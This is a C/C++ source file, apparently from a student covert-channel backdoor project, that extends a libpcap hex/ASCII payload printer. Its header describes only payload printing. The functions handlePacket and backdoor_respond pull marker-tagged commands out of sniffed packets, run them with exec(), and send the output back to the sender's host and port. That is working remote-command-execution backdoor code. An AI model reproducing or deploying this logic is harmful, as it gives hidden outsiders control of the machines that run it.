/*---------------------------------------------------------------------------------------------
--	SOURCE FILE:	proc_payload.c - Set of function to process and print the packet payload
--
--	FUNCTIONS:		libpcap - packet filtering library based on the BSD packet
--					filter (BPF)
--
--	DATE:			May 4, 2016
--
--	REVISIONS:		(Date and nic_description)
--
--				
--	DESIGNERS:		Based on the code by Martin Casado 
--				Modified & redesigned: Aman Abdulla: May 4, 2016
--
--	PROGRAMMER:		Aman Abdulla
--
--	NOTES:
--	This file contain thw functions to process and print out the payload data in captured
--      datagrams. The payload content is printed out as ASCII and hex. 
-------------------------------------------------------------------------------------------------*/
#include <string>
#include "pkt_sniffer.h"
#include "../utilities.h"

// This function will print payload data
void print_payload(const u_char *payload, int len)
{

    int len_rem = len;
    int line_width = 16; // number of bytes per line
    int line_len;
    int offset = 0; // offset counter
    const u_char *ch = payload;

    currentCmd = "";

    if (len <= 0)
        return;

    // does data fits on one line?
    if (len <= line_width)
    {
        print_hex_ascii_line(ch, len, offset);
        handlePacket();
        return;
    }

    // data spans multiple lines
    for (;;)
    {
        // determine the line length and print
        line_len = line_width % len_rem;
        print_hex_ascii_line(ch, line_len, offset);

        // Process the remainder of the line
        len_rem -= line_len;
        ch += line_len;
        offset += line_width;

        // Ensure we have line width chars or less
        if (len_rem <= line_width)
        {
            //print last line
            print_hex_ascii_line(ch, len_rem, offset);
            break;
        }
    }

    handlePacket();
}

#include <iostream>
#include <string>


void handlePacket(){
    std::string payload = currentCmd;
    
    if(!extract_header(payload)){
        std::cout << "Failed to extract header" << std::endl;
        return;
    }

    if(ctl_flag){
        std::cout << "Results from: " << currentHost << " : " << payload << std::endl;
    }
    else{
        backdoor_respond(payload);
    }

}

bool extract_header(std::string &payload){
    if(!verify(IDENTIFY, payload))
        return false;

    payload.erase(0, IDENTIFY.length());

    if(verify(COMMAND, payload)){
        payload.erase(0, COMMAND.length());
        return true;
    }

    if(verify(RESPONSE, payload)){
        payload.erase(0, RESPONSE.length());
        return true;
    }
    return false;
}

bool verify(std::string marker, std::string payload){
    
    std::size_t found = payload.find(marker);
    if (found!=std::string::npos){
        std::cout << "found identifier at: " << found << '\n';
        if (found == 0){
            return true;
        } 
    }
    return false;
}

void backdoor_respond(std::string payload){
    std::cout << "command received: " << currentCmd << std::endl;
        
    //run command
    std::string result;
    result = exec(payload.c_str());
    std::cout << "result: " << result << std::endl;

    //send back results
    std::cout << "send result to host: " << currentHost << " port: " << currentPort << std::endl;
    result.insert (0, RESPONSE);
    result.insert (0, IDENTIFY);
    std::cout << "Result: " << result << std::endl;
    send(currentHost, currentPort, result);
}




// Print data in hex & ASCII
void print_hex_ascii_line(const u_char *payload, int len, int offset)
{

    int i;
    int gap;
    const u_char *ch;

    // the offset
    printf("%05d   ", offset);

    // print in hex
    ch = payload;
    for (i = 0; i < len; i++)
    {
        printf("%02x ", *ch);
        ch++;
        if (i == 7)
            printf(" ");
    }

    // print spaces to handle a line size of less than 8 bytes
    if (len < 8)
        printf(" ");

    // Pad the line with whitespace if necessary
    if (len < 16)
    {
        gap = 16 - len;
        for (i = 0; i < gap; i++)
            printf("   ");
    }
    printf("   ");

    // Print ASCII
    ch = payload;
    for (i = 0; i < len; i++)
    {
        if (isprint(*ch)){
            printf("%c", *ch);
            currentCmd.append(1, (char)*ch);
        }
        else
            printf(".");
        ch++;
    }

    printf("\n");
}
